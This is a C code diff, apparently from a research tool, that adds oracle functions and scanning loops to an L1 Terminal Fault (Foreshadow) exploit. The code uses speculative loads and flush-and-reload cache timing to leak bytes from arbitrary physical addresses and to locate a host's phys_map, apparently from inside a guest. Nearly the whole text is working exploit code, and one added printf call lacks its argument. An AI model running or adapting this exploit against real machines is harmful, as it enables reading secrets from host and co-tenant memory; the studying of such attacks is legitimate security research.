@@ -367,36 +367,122 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   ptedit_cleanup();
 }
 
+int l1tf_oracle16_ffff(uintptr_t physical_addr, int nr_tries, two_byte_reload_buffer *reload_buffer, leak_addr_t leak) {
+  l1tf_leak_buffer_modify(&leak, (void *)physical_addr);
+  uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);
+
+  int hits = 0;
+
+  for (int i = 0; i < nr_tries; i++) {
+    flush(1, (*reload_buffer)[0xffff]);
+    asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
+    ssize_t value = reload(1, (*reload_buffer)[0xffff], THRESHOLD);
+    hits += value != -1;
+  }
+
+  return hits;
+}
+
+int l1tf_oracle16_9797(uintptr_t physical_addr, int nr_tries, two_byte_reload_buffer *reload_buffer, leak_addr_t leak) {
+  l1tf_leak_buffer_modify(&leak, (void *)physical_addr);
+  uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);
+
+  int hits = 0;
+
+  for (int i = 0; i < nr_tries; i++) {
+    flush(1, (*reload_buffer)[0x9797]);
+    asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
+    ssize_t value = reload(1, (*reload_buffer)[0x9797], THRESHOLD);
+    hits += value != -1;
+  }
+
+  return hits;
+}
+
+int l1tf_oracle16_9797_touch(uintptr_t physical_addr, int nr_tries, two_byte_reload_buffer *reload_buffer, leak_addr_t leak, void *touch) {
+  l1tf_leak_buffer_modify(&leak, (void *)physical_addr);
+  uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);
+
+  int hits = 0;
+
+  for (int i = 0; i < nr_tries; i++) {
+    *(volatile char *)touch;
+    lfence();
+    flush(1, (*reload_buffer)[0x9797]);
+    asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
+    ssize_t value = reload(1, (*reload_buffer)[0x9797], THRESHOLD);
+    hits += value != -1;
+  }
+
+  return hits;
+}
+
 void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   initialize_pteditor_lib();
   two_byte_reload_buffer *reload_buffer = aligned_alloc(PAGE_SIZE, sizeof(two_byte_reload_buffer));
   memset(reload_buffer, 0, sizeof(two_byte_reload_buffer));
   leak_addr_t leak = l1tf_leak_buffer_create();
 
+
+  unsigned char *p = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
+  assert(p != MAP_FAILED);
+  memset(p, 0x97, PAGE_SIZE);
+  // printf("mmapped own page `p`; look up its phys addr now and press ENTER\n");
+  // getchar();
+
+
+  printf("Scanning L1d cache for own page\n");
+  uintptr_t own_pa = -1;
+  int found = 0;
+  for (size_t run = 1; run < 1000 && !found; ++run) {
+    printf("run %ld\n", run);
+    for (uintptr_t physical_addr = scan_opts.start; physical_addr < scan_opts.end && !found; physical_addr += scan_opts.stride) {
+      *(volatile char *)(p + (physical_addr & 0xfff));
+      if (l1tf_oracle16_9797(physical_addr, 1, reload_buffer, leak)) {
+        found = 1;
+        printf("\nRun %3ld | HIT! Potential host physical address of phys_map: 0x%lx\n", run, physical_addr);
+        for (int t = 0; t < 10; t += 2) {
+          *(volatile char *)(p + ((physical_addr+t) & 0xfff));
+          if (!l1tf_oracle16_9797(physical_addr+t, 10, reload_buffer, leak)) {
+            printf("No hits at t = %d; i.e. phys_addr = %lx\n", t, physical_addr+t);
+            found = 0;
+            break;
+          }
+        }
+        own_pa = physical_addr & (~0xfffULL);
+      }
+    }
+  }
+  printf("own_pa = %lx\n", own_pa);
+
+  int hot = l1tf_oracle16_9797_touch(own_pa, 100, reload_buffer, leak, p);
+  printf("hot: %d\n", hot);
+  clflush(p);
+  int cold = l1tf_oracle16_9797(own_pa, 100, reload_buffer, leak);
+  printf("cold: %d\n", cold);
+
+  hot = l1tf_oracle16_9797_touch(own_pa+0x800, 100, reload_buffer, leak, p+0x800);
+  printf("hot: %d\n", hot);
+  clflush(p+0x800);
+  cold = l1tf_oracle16_9797(own_pa+0x800, 100, reload_buffer, leak);
+  printf("cold: %d\n", cold);
+
+
+
   printf("Scanning L1d cache for values between 0xffff000000000000 and 0xffffffffffffffff\n");
   size_t max_runs = 1000;
   for (size_t run = 1; run < max_runs; ++run) {
-
-    printf("Run %ld                     \n", run);
-
-    for (uintptr_t physical_addr = scan_opts.start, i = 0; physical_addr < scan_opts.end;
-         physical_addr += scan_opts.stride, ++i) {
-
-      if (i % 100000 == 0) {
-        fprintf(stderr, "run %ld: %.2f%%  \r", run,
-                ((double)(physical_addr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
-                    (double)100);
-      }
-
-      l1tf_leak_buffer_modify(&leak, (void *)physical_addr);
-      uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);
-
-      flush(1, (*reload_buffer)[0xffff]);
-      asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
-      ssize_t value = reload(1, (*reload_buffer)[0xffff], THRESHOLD);
-
-      if (value != -1) {
-        printf("HIT! Potential host physical address of phys_map: 0x%lx\n", physical_addr);
+    if (run % 10 == 0) {
+      printf("\rrun %d");
+      fflush(stdout);
+    }
+    for (uintptr_t physical_addr = scan_opts.start, i = 0; physical_addr < scan_opts.end; physical_addr += scan_opts.stride, ++i) {
+      if (l1tf_oracle16_ffff(physical_addr, 10, reload_buffer, leak)) {
+        printf("\nRun %3ld | HIT! Potential host physical address of phys_map: 0x%lx\n", run, physical_addr);
+        for (int off = 0; off < 32; off += 8) {
+          int hits = l1tf_oracle16_ffff(physical_addr+off, 100, reload_buffer, leak);
+          printf("  %18lx: %4d / %4d\n", physical_addr+off, hits, 100);
+        }
       }
     }
   }
